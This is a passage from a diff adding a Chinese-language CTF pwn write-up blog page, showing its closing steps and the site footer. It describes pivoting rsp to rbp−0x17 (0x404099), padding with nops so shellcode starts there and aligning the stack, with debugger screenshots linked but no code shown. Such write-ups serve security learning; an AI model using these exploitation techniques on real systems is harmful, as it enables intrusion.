+<p><em>省流：让rsp指向rbp减0x17处</em></p>
+<p>那么执行这个之后rsp指向了：<code>[rbp]0x4040b0 - 0x17 = 0x404099</code>,很接近了，那么可以填充一个空指令<code>nop</code>让shellcode的开始位置就在0x404099</p>
+<p>执行以下<code>reg函数</code>之后，确实和我们计算的一样，<code>rsp</code>指向了0x404099</p>
+<p><img src="/./images/image-20250204152000363.png" alt="image-20250204152000363"></p>
+<p>接下来再调试一下shellcode</p>
+<p><img src="/./images/image-20250204152406421.png" alt="image-20250204152406421"></p>
+<p><em>这里多填充两个空指令，对齐栈</em></p>
+<p><strong>运行一下，over</strong></p>
+<p><img src="/./images/image-20250204152649263.png" alt="image-20250204152649263"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/04/NPCCTF/wp/" rel="prev" title="">
+                  <i class="fa fa-angle-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/04/04/whuctf2024/wp/" rel="next" title="">
+                   <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Maple</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
